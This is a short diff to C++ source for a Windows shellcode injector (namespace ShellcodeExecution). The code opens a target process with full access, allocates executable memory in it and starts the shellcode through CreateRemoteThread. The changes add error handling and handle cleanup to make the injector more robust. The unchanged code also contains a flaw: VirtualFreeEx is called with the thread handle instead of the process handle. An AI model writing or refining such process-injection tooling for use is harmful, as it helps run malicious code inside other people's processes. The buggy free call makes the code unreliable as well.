@@ -32,12 +32,19 @@ namespace ShellcodeExecution
 			// Open the process
 			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
 
+			if (hProcess == NULL)
+			{
+				std::cout << "[!!] Failed to open process: " << GetLastError() << std::endl;
+				return -1;
+			}
+
 			// Allocate memory in the process for the shellcode
 			LPVOID allocatedMemory = VirtualAllocEx(hProcess, NULL, this->_shellcodeSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
 
 			if (allocatedMemory == NULL)
 			{
 				std::cout << "[!!] Failed to allocate memory: " << GetLastError() << std::endl;
+				CloseHandle(hProcess);
 				return -1;
 			}
 
@@ -50,7 +57,8 @@ namespace ShellcodeExecution
 			HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)allocatedMemory, NULL, 0, NULL);
 
 			if (hThread == NULL) {
-				std::cout << "[!!] Failed to obtain handle to process: " << GetLastError() << std::endl;
+				std::cout << "[!!] Failed to obtain handle to remote thread: " << GetLastError() << std::endl;
+				CloseHandle(hProcess);
 				return -1;
 			}
 
@@ -64,7 +72,7 @@ namespace ShellcodeExecution
 			// Free the memory
 			VirtualFreeEx(hThread, allocatedMemory, 0, MEM_RELEASE);
 
-			std::cout << "[*] Closing handle..." << std::endl;
+			std::cout << "[*] Closing handles..." << std::endl;
 
 			CloseHandle(hThread);
 
